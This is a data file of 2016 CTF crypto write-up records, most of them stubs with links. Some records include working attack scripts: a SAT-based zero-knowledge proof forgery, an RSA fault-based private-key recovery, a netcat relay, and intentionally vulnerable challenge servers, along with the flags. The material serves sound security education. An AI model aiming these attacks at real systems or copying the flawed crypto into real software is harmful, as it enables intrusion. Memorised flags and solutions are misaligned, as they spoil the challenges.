{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\backdoor-ctf-2016\\crypto\\collision-course-350", "year": "2016", "name": "collision-course-350", "writeup": "# Backdoor CTF : collision-course-350\n\n**Category:** Crypto\n**Points:** 350\n**Solves:** 7\n**Description:**\n\n> In today's world, hash collisions are becoming more and more popular. That is why, one must rely on standardized hashing techniques, such as bcrypt. However, n00bster shall never learn, and he has implemented his own hash function which he proudly calls foobar. Attached is an implementation of the hash function and a file with which you are supposed to find a collision. He believes that you will not be able to find a collision for the file, especially since he hasn't even given you the hashing algorithm, but has packaged it as a black box application. Prove to him that he is wrong.\n>\n>\n> Note: Multiple collisions are possible, but only one of them is a valid flag.\n>\n> You will realize you've gotten it once you do.\n>\n> Created by: Jay Hitesh Bosamiya\n>\n> No. of Correct Submissions: 7\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://grocid.net/2016/06/05/backdoorctf16-collision-course/\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_collision_course)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\backdoor-ctf-2016\\crypto\\crc-250", "year": "2016", "name": "crc-250", "writeup": "# Backdoor CTF : crc-250\n\n**Category:** Crypto\n**Points:** 250\n**Solves:**  9\n**Description:**\n\n> Backdoor user IamLupo wanted to submit his challenge for BackdoorCTF16 but he was struck by lightening and his challenge file shattered into 26 pieces. We want you to recover it for us (and maybe get the flag while you do it). Thanks in advance! Here is the zipped file:\n>\n> <http://hack.bckdr.in/CRC/challenge.zip>\n>\n> Created by: IamLupo\n>\n> No. of Correct Submissions: 9\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_crc)\n* http://www.codilime.com/backdoorctf16-crc/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\backdoor-ctf-2016\\crypto\\forge-350", "year": "2016", "name": "forge-350", "writeup": "# Backdoor CTF : forge-350\n\n**Category:** Crypto\n**Points:** 350\n**Solves:** 6\n**Description:**\n\n> Mandogs are about to take over Backdoor. Help us defeat them. Here: <http://hack.bckdr.in/FORGE>\n>\n> Created by: Ashish Chaudhary\n>\n> No. of Correct Submissions: 6\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_forge)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\backdoor-ctf-2016\\crypto\\mindblown-150", "year": "2016", "name": "mindblown-150", "writeup": "# Backdoor CTF : mindblown-150\n\n**Category:** Crypto\n**Points:** 150\n**Solves:** 23\n**Description:**\n\n> Chintu has secured his flag behind a secure auth. We managed to get the authentication logic of the system. Can you help us get his flag from here. Bruteforce is not needed.\n>\n> Created by: Amanpreet Singh\n>\n> No. of Correct Submissions: 23\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [b0tchsec](http://b0tchsec.com/2016/backdoorctf/mindblown)\n* [RawSec](https://rawsec.ml/en/writeups-crypto-mindblown/)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-06-04-backdoor-ctf/crypto_mindblown)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\bctf-2016\\crypto\\special_rsa-200", "year": "2016", "name": "special_rsa-200", "writeup": "#bctf 2016 special_rsa writeup\n\n###*Category:* Reverse *Points:* 200 \n\n> While studying and learning RSA, I knew a new form of encryption/decryption with the same safety as RSA.\n>\n> I encrypted msg.txt and got msg.enc as an example for you.\n>\n> $ python special_rsa.py enc msg.txt msg.enc\n>\n> Can you recover flag.txt from flag.enc?\n\n## write-up\n\n(TODO)\n\n## Other write-ups and resources\n* <https://cryptsec.wordpress.com/2016/03/21/bctf-2016-write-up-special-rsa-crypto-200/>\n* <http://ctf.publog.jp/archives/1054247932.html> (Japanese)\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\bioterra-ctf-2016\\crypto\\for-100", "year": "2016", "name": "for-100", "writeup": "# BioTerra CTF 2016 : for-100\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** \n**Description:**\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\bobs-hat-4", "year": "2016", "name": "bobs-hat-4", "writeup": "# Boston Key Party CTF : bobs-hat-4\n\n**Category:** Crypto\n**Points:**4\n**Solves:**73\n**Description:**\n\n> Alice and Bob are close together, likely because they have a lot of things in common.  This is why Alice asked him a small \\*q\\*uestion, about something cooler than a wiener\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [CTF.RIP](https://ctf.rip/boston-key-party-2016-bobs-hat-crypto/)\n* <http://err0r-451.ru/2016-bkpctf-crypto-bobs-hat-4-pts/>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\des-ofb-2", "year": "2016", "name": "des-ofb-2", "writeup": "# Boston Key Party CTF : des-ofb-2\n\n**Category:** Crypto\n**Points:**2\n**Solves:**189\n**Description:**\n\n> Decrypt the message, find the flag, and then marvel at how broken everything is.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [0day](https://0day.work/boston-key-party-ctf-2016-writeups/#desofb)\n* <https://cryptsec.wordpress.com/2016/03/07/boston-key-party-ctf-write-up-2016-des-ofb-crypto-2/>\n* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/desofb>\n* <https://github.com/Alpackers/CTF-Writeups/tree/master/2016/BostonKeyParty/Crypto/des-ofb>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/crypto_2_des_ofb)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\gsilvis-counting-magic-9", "year": "2016", "name": "gsilvis-counting-magic-9", "writeup": "# Boston Key Party CTF : gsilvis-counting-magic-9\n\n**Category:** Crypto\n**Points:**9\n**Solves:**7 \n**Description:**\n\n> Here's a verification/decryption server:  gcm.ctf.bostonkey.party:32768 .  Get the GCM MAC key (the thing the server prints out on startup).  We've given you one valid ciphertext to get you started.  It has  iv: [102 97 110 116 97 115 116 105 99 32 105 118] and tag: [119 179] \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\hamc_crc-5", "year": "2016", "name": "hamc_crc-5", "writeup": "# Boston Key Party CTF : hamc_crc-5\n\n**Category:** Crypto\n**Points:**5\n**Solves:**43\n**Description:**\n\n> We're trying a new mac here at BKP---HMAC-CRC. The hmac (with our key) of \"zupe zecret\" is '0xa57d43a032feb286'.  What's the hmac of \"BKPCTF\"?\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/raccoons-team/ctf/tree/master/2016-03-07-boston-key-party-ctf/crypto_5_hmac_crc>\n* <https://github.com/DeliciousHorse/2016.03.BostonKeyParty/blob/master/hmac_crc.md>\n* <http://andrewl.dreamhosters.com/lblog/2016-03-06_bostonkeyparty_hmac_crc_writeup/writeup.html>\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\ltseorg-4", "year": "2016", "name": "ltseorg-4", "writeup": "# Boston Key Party CTF : ltseorg-4\n\n**Category:** Crypto\n**Points:**4\n**Solves:**93\n**Description:**\n\n> make some (charlie)hash collisions! ltseorg.bostonkey.party 5555\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/ltseorg>\n* [0day](https://0day.work/boston-key-party-ctf-2016-writeups/#ltseorg)\n* <http://err0r-451.ru/bkpctf-crypto-ltseorg-4-pts/>\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-03-06-bkpctf/crypto_4_ltseorg)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\boston-key-party-2016\\crypto\\more-like-zkp-4", "year": "2016", "name": "more-like-zkp-4", "writeup": "# Boston Key Party CTF 2016 : More Like ZKP\n\n**Category:** Crypto\n**Points:** 4 \n**Description:** \n\n> We've made a zero-knowledge proof protocol for graph 3-coloring. \nHere are prover (52.86.232.163:32795) and verifier (52.86.232.163:32794) \nservers. \nConvince the verifier that you know the prover's graph-coloring! \nhttps://s3.amazonaws.com/bostonkeyparty/2016/48cdc8756b6a9a5052c6da2d061b9bd61d13a1fa.tgz\n\n## Write-up\n\n**by [LosFuzzys](https://hack.more.systems)**\n\nThe proof is based on a three-colored graph, where the graph was given,\nbut the colors not.\n\ngraph.txt:\n\n```\n# 683\n129 495\n129 613\n1 2\n2 489\n2 507\n3 507\n3 495\n495 613\n215 489\n215 613\n...\n```\n\nIn the proving step, the colors (AES encrypted) have to be sent to the \nverifier. The verifier selects one random edge, asks for the keys,\nand checks if the vertices on the edge have the same color. \nIf not, the process is repeated 1000 times. A successful proof is\nrewarded with the flag.\n\n```go\nfunc handle_connection(conn net.Conn) {\n    defer func() {\n        e := recover()\n        if e != nil {\n            if uerr, ok := e.(UserError); ok {\n                conn.Write([]byte(uerr.Error()))\n            }\n        }\n        conn.Close()\n    }()\n\n    successes := 0\n    for {\n        // Get the colors\n        ciphers := get_colors(conn)\n        // Send a challenge (pair of vertices)\n        v1, v2 := gen_challenge()\n        send_challenge(conn, Edge{v1, v2})\n        // Get the AES keys\n        k1, k2 := get_keys(conn)\n        if decrypt(ciphers[v1], k1) == decrypt(ciphers[v2], k2) {\n            // Colors don't match!\n            panic(UserError{\"Those are the same color!\"})\n            return;\n        }\n        successes += 1\n        if successes == THRESHOLD {\n            // Okay, I believe you\n            conn.Write([]byte(\"BKPCTF{\" + flag + \"}\"));\n            conn.Close()\n            return\n        }\n    }\n}\n```\n\nOur first try was to connect the prover and verifier with netcat:\n\n```\nmkfifo backpipe\nnc 52.86.232.163 32794 0<backpipe | nc 52.86.232.163 32795 1>backpipe\n```\n\nBut the prover sets some bytes, that the verifier doesn't accept. But\nworse, the prover answers with random colors! So a complete new attempt\nmust be found.\n\nThanks to @meisterluk, we found out, that a SAT solver is useful for\ngraph three-coloring. There are two conditions, that have to be\nsatisfied:\n\n* Every vertex has one of the three colors.\n* Not the same color on one edge.\n\nThe SAT solver runs for less than a second until the colors are found.\nAll colors are encrypted with a static key (```MASTER_KEY```) and\nthen sent to the verifier. The step took some minutes, since several\nmegabytes have to be transmitted. The reason is, because the colors\nhave to be sent 1000 times.\n\nAttack script:\n\n```python\n#!/usr/bin/env python2\nfrom __future__ import print_function\nfrom satispy import Variable, Cnf\nfrom satispy.solver import Minisat\nimport socket\nimport struct\nfrom Crypto.Cipher import AES\n\nVERTICES = 683\n\ndef readGraphFile():\n    gra", "solution_code": "\n# solve_more_like_zkp.py\n#!/usr/bin/env python2\nfrom __future__ import print_function\nfrom satispy import Variable, Cnf\nfrom satispy.solver import Minisat\nimport socket\nimport struct\nfrom Crypto.Cipher import AES\n\nVERTICES = 683\n\ndef readGraphFile():\n    graph_file = open('graph.txt', 'r')\n    graph = []\n    for line in graph_file:\n        if line[0] != '#':\n            nums = list(map(int, line[:-1].split(' ')))\n            graph.append(nums)\n\n    graph_file.close()\n    return graph\n\ngraph = readGraphFile()\n\nexp = Cnf()\nc1 = dict()\nc2 = dict()\nc3 = dict()\n\n# one of the three colors for a vertex\nfor vertex in range(VERTICES):\n    c1[vertex] = Variable('edge%dhasColor1' % vertex)\n    c2[vertex] = Variable('edge%dhasColor2' % vertex)\n    c3[vertex] = Variable('edge%dhasColor3' % vertex)\n    \n    # one of three\n    exp &= c1[vertex] | c2[vertex] | c3[vertex]\n    exp &= c1[vertex] | -c2[vertex] | -c3[vertex]\n    exp &= -c1[vertex] | c2[vertex] | -c3[vertex]\n    exp &= -c1[vertex] | -c2[vertex] | c3[vertex]\n    \n# not same color on one edge\nfor edge in graph:\n    begin = edge[0]\n    end = edge[1]\n    exp &= -c1[begin] | -c1[end]\n    exp &= -c2[begin] | -c2[end]\n    exp &= -c3[begin] | -c3[end]\n\n# solve it\nsolver = Minisat()\nsolution = solver.solve(exp)\n\ncolors = [0] * VERTICES\nif solution.success:\n    print(\"Found a solution:\")\n    for vertex in range(VERTICES):\n        if solution[c1[vertex]]:\n            colors[vertex] = 1\n        if solution[c2[vertex]]:\n            colors[vertex] = 2\n        if solution[c3[vertex]]:\n            colors[vertex] = 3\n    print(colors)\nelse:\n    print(\"The expression cannot be satisfied\")\n    \n    \n# CHECK FOR ERRORS -----------------------------------------------------\nerror_detected = False\nfor edge in graph:\n    if colors[edge[0]] == colors[edge[1]]:\n        print(str(edge))\n        error_detected = True\nif error_detected == False:\n    print(\"ok\")\nelse:\n    print(\"ERROR\")\n\n\n# CREATE ENCRYPTED COLORS ----------------------------------------------\nMASTER_KEY = \"0123456789ABCDEF\"\n\ncolors_enc = []\nfor color in colors:\n    cipher = AES.new(MASTER_KEY, AES.MODE_ECB, '')\n    color = struct.pack(\"IIII\", color, 0, 0, 0)\n    colors_enc.append(cipher.encrypt(color))\n\n\n# TCP TO VERIFIER ------------------------------------------------------\nTCP_IP = '52.86.232.163'\nTCP_PORT = 32794 # verifier\nBLOCK_SIZE = 16\nVERTICES = 683\nFLAGSTART = \"BKPCTF{\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((TCP_IP, TCP_PORT))\ns.settimeout(60.0)\n\nfor i in range(1000):\n    s.send(\"\".join(colors_enc))\n    challange = s.recv(8)\n    cx = struct.unpack(\">II\", challange)\n    print(\"%d: \" % i, end=\"\")\n    print(cx)\n    s.sendall(MASTER_KEY)\n    s.sendall(MASTER_KEY)\n\nresp = s.recv(50)\nprint(resp)\ns.close()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\breakin-ctf-2016\\crypto\\crypto-numbero-100", "year": "2016", "name": "crypto-numbero-100", "writeup": "# Break In 2016 - Crypto-Numbero\n\n**Category:** Crypto\n**Points:** 100\n**Solves:** 7\n**Description:**\n\n> 249929761157732020161556121009125440871694502549075144988219699324612968709313502340276966732128645621282888705508840858566948023130606222964801977446316823159281256329353559220858509063084671505269932006162189731434947807072043095879259154468002856960\n\n## Write-up\n\nby [ParthKolekar](https://github.com/ParthKolekar)\n\nIn this question the number given was a double type. So all one had to do \nwas to understand this part and after that it was just scanning and printing \nthe number. \n\nStarting approach could be to read the number and then convert it to string \nbyte by byte but that would lead to some garbage chars at the end and that's \nwhen one has to figure out that the number is larger than an integer. So now \ntry out some other data types of larger size than int.\n\nHere's the code for how this number was created:\n\n249929761157732020161556121009125440871694502549075144988219699324612968709313502340276966732128645621282888705508840858566948023130606222964801977446316823159281256329353559220858509063084671505269932006162189731434947807072043095879259154468002856960\n\n    /********** strtodouble.c ********************/\n    #include<stdio.h>    \n    int main() {\n        double d[8];\n        scanf(\"%s\", d); \n        printf(\"%lf\\n\", d[0]);\n        return 0;\n    }\n\nAfter the string was converted to double, the decimal part was removed to \nincrease the difficulty by broadning the field in which number could \nlie. Also removing the decimal part had no effect on the string.\n\n\nAnd here's the code to read the number and then print it in string:\n\n    /********** doubletostr.c ********************/\n    #include<stdio.h>    \n    int main() {\n        double x;\n        scanf(\"%lf\", &x);\n        puts(&x);\n        printf(\"\\n%s\\n\",&x);\n        return 0;\n    }\n\nOn running the number via this you get\n\n    y0ug0t!t\n\nWhich is the flag.\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\csaw-ctf-2016-quals\\crypto\\broken-box-300", "year": "2016", "name": "broken-box-300", "writeup": "# CSAW CTF 2016 Quals: Broken_Box\n\n**Category:** Crypto\n**Points:** 300\n**Solves:**\n**Description:**\n\n*this challenge doesn't support source code*\nChallenge name: Broken Box\n\nDescription: I made a RSA signature box, but the hardware is too old, sometimes it return me a wrong answer... something about bits being flipped?... can you fix it for me?\ne = 0x10001\nnc 192.241.234.35 31337\n\n## Write-up\n\nflag{br0k3n_h4rdw4r3_l34d5_70_b17_fl1pp1n6}\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/csaw-quals-2016-broken-box-crypto-300-400/\n* https://github.com/grocid/CTF/tree/master/CSAW/2016\n* https://github.com/grocid/CTF/tree/master/CSAW/2016#broken-box-300-p\n* https://github.com/ernw/ctf-writeups/tree/master/csaw2016/broken_box\n* [Halhacktic Trendsetters](https://galhacktictrendsetters.wordpress.com/2016/09/21/csaw-quals-2016-broken-box/)\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/broken_box)\n", "solution_code": "\n# broken_box.py\nfrom functools import wraps\nimport errno\nimport os\nimport signal\nimport SocketServer\nimport random, time\n\nclass TimeoutError(Exception):\n    pass\n\ndef timeout(seconds=10, error_message=os.strerror(errno.ETIME)):\n    def decorator(func):\n        def _handle_timeout(signum, frame):\n            raise TimeoutError(error_message)\n\n        def wrapper(*args, **kwargs):\n            signal.signal(signal.SIGALRM, _handle_timeout)\n            signal.alarm(seconds)\n            try:\n                result = func(*args, **kwargs)\n            finally:\n                signal.alarm(0)\n            return result\n\n        return wraps(func)(wrapper)\n\n    return decorator\n\n@timeout(60)\ndef recv(req, bytes):\n        return req.recv(bytes)\n\ndef sign(req):\n        d = 131811419667704353419669934273801498497646935210532028120447799308664007960357278340261723808572637548407550908403239344903997788296564439667659716110934822412855421586673808904193606481137679044132688115472132575150399986901493501056787817443487153162937855786664238603417924072736209641094219963164897214757\n        N = 172794691472052891606123026873804908828041669691609575879218839103312725575539274510146072314972595103514205266417760425399021924101213043476074946787797027000946594352073829975780001500365774553488470967261307428366461433441594196630494834260653022238045540839300190444686046016894356383749066966416917513737\n        bits = list(range(0, 1025))\n        random.shuffle(bits)\n        while True:\n            req.sendall(\"Input an number(0~9999) to be signed:\")\n            msg = recv(req, 5)\n            try:\n                g = int(msg)\n                if g < 0 or g > 9999:\n                        raise Exception\n            except:\n                req.sendall(\"Wrong input, quitting...\")\n                return\n\n            if random.random() < 0.5:\n                pos = bits.pop()\n                enc = pow(g, d^(2**pos), N)\n            else:\n                enc = pow(g, d, N)\n            req.sendall(\"signature:{0}, N:{1}\".format(str(enc), N))\n            req.sendall(\"\\nSign more items?(yes, no):\")\n            choice = recv(req, 4).split('\\n')[0]\n            if choice == 'no':\n                break\n\nclass incoming(SocketServer.BaseRequestHandler):\n    def handle(self):\n        random.seed(time.time())\n        req = self.request\n        sign(req)\n\nclass ReusableTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n    pass\n\nSocketServer.TCPServer.allow_reuse_address = True\nserver = ReusableTCPServer((\"0.0.0.0\", 8000), incoming)\nserver.timeout = 60\nserver.serve_forever()\n\n# solver.py\nfrom sparrowCTF import *\n\ndef pos(g, orig_s, err_s, N):\n    r = list(range(1025))\n    for x in r:\n        if (err_s * pow(g, 2**x, N)) % N == orig_s:\n            r.remove(x)\n            return x, 1\n        elif (orig_s * pow(g, 2**x, N)) % N == err_s:\n            r.remove(x)\n            return x, 0\n\ndef rotate(req):\n    req.recv_until(\":\")\n    req.sendline(\"yes\")\n    req.recv_until(\":\")\n\ndef NnS():\n    r = Remote(\"192.241.234.35\", 31337, debug=False)\n    r.sendline(\"3\")\n    #get N\n    N = r.recvline()[:-1].split(':')[-1]\n    rotate(r)\n    r.sendline(\"3\")\n    #get orig_s\n    ss = list()\n    while len(ss) == len(set(ss)):\n        rotate(r)\n        r.sendline(\"3\")\n        orig_s = r.recvline().split(',')[0].split(':')[-1]\n        ss.append(orig_s)\n\n    return int(N), int(orig_s)\n\ndef solve():\n    N, orig_s = NnS()\n    e = 0x10001\n    g = 3\n    r = Remote(\"192.241.234.35\", 31337, debug=False)\n    res = 0\n    bits = 1024\n    d = 131811419667704353419669934273801498497646935210532028120447799308664007960357278340261723808572637548407550908403239344903997788296564439667659716110934822412855421586673808904193606481137679044132688115472132575150399986901493501056787817443487153162937855786664238603417924072736209641094219963164897214757\n    while bits > -1:\n        r.sendline(\"3\")\n        sig = int(r.recvline().split(',')[0].split(':')[-1])\n        rotate(r)\n\n        if sig == orig_s:\n            continue\n        p, b = pos(g, orig_s, sig, N)\n        res += (2**p) * b\n        bits -= 1\n        print \"[+] {0} bits left to map...\\n[+] current d:{1}\".format(bits, res)\n\n    assert d == res\n\ndef main():\n    solve()\n\nif __name__ == \"__main__\":\n    main()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\csaw-ctf-2016-quals\\crypto\\neo-200", "year": "2016", "name": "neo-200", "writeup": "# CSAW CTF 2016 Quals: Neo\n\n**Category:** Crypto\n**Points:** 150\n**Solves:**\n**Description:**\n\nYour life has been boring, seemingling meaningless up until now. A man in a black suit with fresh shades is standing in front of you telling you that you are The One. Do you chose to go down this hole? Or just sit around pwning n00bs for the rest of your life?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/neo)\n* https://ctftime.org/writeup/4155\n* https://eugenekolo.com/blog/csaw-qual-ctf-2016/#neo\n* https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/crypto-200-neo.md\n* https://github.com/grocid/CTF/tree/master/CSAW/2016\n* https://thegoonies.rocks/csaw-quals-2016-neo-crypto/\n", "solution_code": "\n# gunicorn_config.py\nbind = '0.0.0.0:8000'\nbacklog = 2048\n\nworkers = 10\nworker_class = 'sync'\nworker_connections = 1000\ntimeout = 10\nkeepalive = 2\n\nuser = \"neo\"\ngroup = \"neo\"\n\n# serve.py\nfrom app import create_app\napp = create_app()\napp.run(debug=False, threaded=True, host=\"0.0.0.0\", port=8000)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\csaw-ctf-2016-quals\\crypto\\neo-200\\app", "year": "2016", "name": "app", "solution_code": "\n# views.py\nfrom flask import render_template, request\nimport hashlib, struct, json\nfrom Crypto.Cipher import AES, DES\nfrom Crypto import Random\nimport base64\nimport hashlib\nimport hmac\nimport os\nimport time\nimport random\n\nIV = Random.new().read(AES.block_size)\n\nchallenge_flag = \"flag{what_if_i_told_you_you_solved_the_challenge}\"\nchallenge_key  = 'csawctf_uber_key'\n\nclass PKCS7PaddingError(Exception):\n    def __init__(self, message, data):\n        super(PKCS7PaddingError, self).__init__(message)\n        self.data = data\n\n    def __str__(self):\n        return self.message + \": \" + repr(self.data)\n\ndef pkcs7_padding(text, block_size=16):\n    pad = len(text) % block_size\n    if pad == 0:\n        return text\n    pad = block_size - pad\n    return text + bytes(chr(pad) * pad, 'utf-8')\n\ndef pkcs7_unpad(text, block_size=16):\n    pad = text[-1]\n    if pad > block_size:\n        raise PKCS7PaddingError(\"Given padding is not valid\", text)\n\n    pad_chars = text[-pad:]\n    if (len(pad_chars) == 1 and pad_chars[0] == 0x01) or \\\n        all([pad_chars[0] == c for c in pad_chars[1:]]):\n        return text[:-pad]\n    else:\n        raise PKCS7PaddingError(\"Given padding is not valid\", text)\n\ndef aes_encrypt(key, string):\n    global IV\n    cipher = AES.new(key, AES.MODE_CBC, IV)\n    plaintext = pkcs7_padding(string, len(key))\n\n    encrypt = cipher.encrypt(plaintext.decode(\"utf-8\"))\n    return_data = IV + encrypt\n    return return_data\n\ndef aes_decrypt(key, data):\n    IV = data[0:len(key)]\n    data = data[len(key):]\n    \n    cipher = AES.new(key, AES.MODE_CBC, IV)\n    decrypt = cipher.decrypt(data)\n    return pkcs7_unpad(decrypt, len(key))\n\ndef init_views(app):\n    @app.route('/', methods=['GET', 'POST'])\n    def challenge():\n        matrix_id = base64.b64encode(aes_encrypt(challenge_key, bytes(challenge_flag, \"utf-8\"))).decode(\"utf-8\")\n\n        if request.method == 'GET':\n            return render_template('index.html', matrix_id=matrix_id)\n\n        try:\n            sid = base64.b64decode(bytes(request.form.get('matrix-id'), 'utf-8'))\n        except:\n            error = \"Neo, that isn't base64. What are you thinking? How are we going to save humanity if you don't even know how to base64 encode something properly???\"\n            return render_template('index.html', matrix_id=matrix_id, error=error)\n\n        if sid:\n            try:\n                ptext = aes_decrypt(challenge_key, sid)\n            except:\n                error = \"Caught exception during AES decryption...\"\n                return render_template('index.html', matrix_id=request.form.get('matrix-id'), error=error)\n\n            return render_template('index.html')\n        else:\n            return render_template('index.html', matrix_id=matrix_id)\n\n# __init__.py\nfrom flask import Flask, render_template, request, redirect, abort, jsonify, json as json_mod, url_for\nimport logging\nimport os\n\ndef create_app():\n    app = Flask(\"app\", static_folder=\"static\", template_folder=\"templates\")\n    with app.app_context():\n        from app.views import init_views\n        init_views(app)\n        return app\n\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\csaw-ctf-2016-quals\\crypto\\sleeping-guard-50", "year": "2016", "name": "sleeping-guard-50", "writeup": "# CSAW CTF 2016 Quals: Sleeping_Guard\n\n**Category:** Crypto\n**Points:** 50\n**Solves:**\n**Description:**\n\nOnly true hackers can see the image in this magic PNG....\n\n## Write-up\n\nAnswer:\n(flag printed in the decrypted magic.png file)\nflag{l4zy_H4CK3rs_d0nt_g3T_MAg1C_FlaG5}\n\nOrganizer Description:\n    This challenge is a server which sends you a base64 encoded PNG image. The hint is given in the title to solve this. First that the encoding mechanism is a Xor and the way to decrypt is use the fact that all PNG's have the same first 12 byte headers.\n\nTo distribute:\n    sleeping_49d06c703032f66151ae07066d509c61.py  (md5sum appended)\n\nSetup:\n    Distrubute the server code after REMOVING the encryption key used in the Xor.\n    Server side run the server with the correct key in it.\n\nHints:\n    Possible hints are look at the title for clues. All files have same magic header.\n\nSolution Script:\n    Attached is the solution script to recover the key to xor with.\n\n## Other write-ups and resources\n\n* https://github.com/grocid/CTF/tree/master/CSAW/2016\n* http://www.megabeets.net/csaw-2016-sleeping-guard-writeup/\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/sleeping_guard)\n* https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/crypto-50-sleeping_guard.md\n* https://github.com/grocid/CTF/tree/master/CSAW/2016#sleeping-guard-50-p\n* https://crackinglandia.wordpress.com/2016/09/21/csaw-ctf-2016-qualification-round-crypto-sleeping-guard-50-pts/\n* https://binarystud.io/csaw-2016-sleeping-guard-writeup.html\n", "solution_code": "\n# sleeping.py\nimport base64\nfrom twisted.internet import reactor, protocol\nimport os\n\nPORT = 8000\n\nimport struct\ndef get_bytes_from_file(filename):  \n    return open(filename, \"rb\").read()  \n    \n# remove this for distribution of server\nKEY = \"WoAh_A_Key!?\"\n\ndef length_encryption_key():\n    return len(KEY)\n\ndef get_magic_png():\n    image = get_bytes_from_file(\"./sleeping.png\")\n    encoded_string = base64.b64encode(image)\n    key_len = length_encryption_key()\n    print 'Sending magic....'\n    if key_len != 12:\n        return ''\n    return encoded_string \n    \n\nclass MyServer(protocol.Protocol):\n    def connectionMade(self):\n        resp = get_magic_png()\n        self.transport.write(resp)\n\nclass MyServerFactory(protocol.Factory):\n    protocol = MyServer\n\nfactory = MyServerFactory()\nreactor.listenTCP(PORT, factory)\nreactor.run()\n\n# sleeping_dist.py\nimport base64\nfrom twisted.internet import reactor, protocol\nimport os\n\nPORT = 8000\n\nimport struct\ndef get_bytes_from_file(filename):  \n    return open(filename, \"rb\").read()  \n    \nKEY = \"[CENSORED]\"\n\ndef length_encryption_key():\n    return len(KEY)\n\ndef get_magic_png():\n    image = get_bytes_from_file(\"./sleeping.png\")\n    encoded_string = base64.b64encode(image)\n    key_len = length_encryption_key()\n    print 'Sending magic....'\n    if key_len != 12:\n        return ''\n    return encoded_string \n    \n\nclass MyServer(protocol.Protocol):\n    def connectionMade(self):\n        resp = get_magic_png()\n        self.transport.write(resp)\n\nclass MyServerFactory(protocol.Factory):\n    protocol = MyServer\n\nfactory = MyServerFactory()\nreactor.listenTCP(PORT, factory)\nreactor.run()\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\csaw-ctf-2016-quals\\crypto\\still-broken-box-400", "year": "2016", "name": "still-broken-box-400", "writeup": "# CSAW CTF 2016 Quals: Still_Broken_Box\n\n**Category:** Crypto\n**Points:** 400\n**Solves:**\n**Description:**\n\n*this challenge doesn't support source code*\nChallenge name: Still Broken Box\n\nDescription: I fixed the RSA signature box I made, even though it still returns wrong answers sometimes, it get much better now.\ne = 97\nnc 192.241.234.35 31337\n\n## Write-up\nflag{n3v3r_l34k_4ny_51n6l3_b17_0f_pr1v473_k3y}\n\n## Other write-ups and resources\n\n* http://mslc.ctf.su/wp/csaw-quals-2016-broken-box-crypto-300-400/\n* https://github.com/grocid/CTF/tree/master/CSAW/2016\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/still_broken_box)\n* https://github.com/grocid/CTF/tree/master/CSAW/2016#still-broken-box-400-p\n* [Halhacktic Trendsetters](https://galhacktictrendsetters.wordpress.com/2016/09/22/csaw-quals-2016-still-broken-box/)\n", "solution_code": "\n# solver.sage.py\n# This file was *autogenerated* from the file solver.sage\nfrom sage.all_cmdline import *   # import sage library\n_sage_const_3 = Integer(3); _sage_const_2 = Integer(2); _sage_const_1 = Integer(1); _sage_const_0 = Integer(0); _sage_const_0x10001 = Integer(0x10001);  